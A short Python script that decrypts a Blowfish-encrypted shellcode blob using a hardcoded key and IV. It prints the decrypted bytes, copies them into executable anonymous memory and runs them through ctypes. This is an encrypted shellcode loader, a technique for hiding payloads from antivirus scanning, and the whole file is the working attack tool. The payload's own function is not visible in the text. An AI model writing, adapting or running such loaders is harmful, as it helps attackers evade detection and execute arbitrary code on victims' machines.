import blowfish
import mmap
import ctypes

def main():
	
	encrypted_shellcode = b'7@"\x19\xb1\xaf\xd8\xb5\xe7\xe3\x03\x9b\xfd\x9cf\xf5\x8chto\xb43^\xa6W\x8c\x01\xcfR\x1e11\x1d\xca)\x97\x90\xbdF\xb8\xb0l\x15\xe6(t,\x8e\x99\x9a\xee!u\x19`\n\xd1\xbe\xea\xb5\xcd\xa1\xc6\xa2\x08\xdbIi\xe8\xf9X\xf16\xb9\xeb\x15j0-\xe4\x81q\xafW\xb2\x9d\x86\x81]S\x9dSg\xf0\xce\xe1\xfc?\xd99\xf6\xe4\x86\x1e\xdd\xc5\xad_d\x14\x00n'
	
	decrypter = blowfish.Cipher(b'sh3llc0de')
	iv = b'88888888'

	decrypted_shellcode = b"".join(decrypter.decrypt_cbc(encrypted_shellcode, iv))
	print("[+] Decryption completed. Decrypted shellcode:")
	print(decrypted_shellcode)
	print("\n")

	shellbytes = bytearray(decrypted_shellcode)

	decrypted = ""

	for x in bytearray(shellbytes):
		decrypted += '\\x'
		decrypted += '%02x' % x

	print("[+] Decrypted raw shellcode:")
	print(decrypted)


	map_memory = mmap.mmap(0, len(decrypted_shellcode), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)
	map_memory.write(decrypted_shellcode)
	
	result = ctypes.c_int64
	args = tuple()
	buffered = ctypes.c_int.from_buffer(map_memory)
	execute = ctypes.CFUNCTYPE(result, *args)(ctypes.addressof(buffered))
	execute()


if __name__ == '__main__':
	main()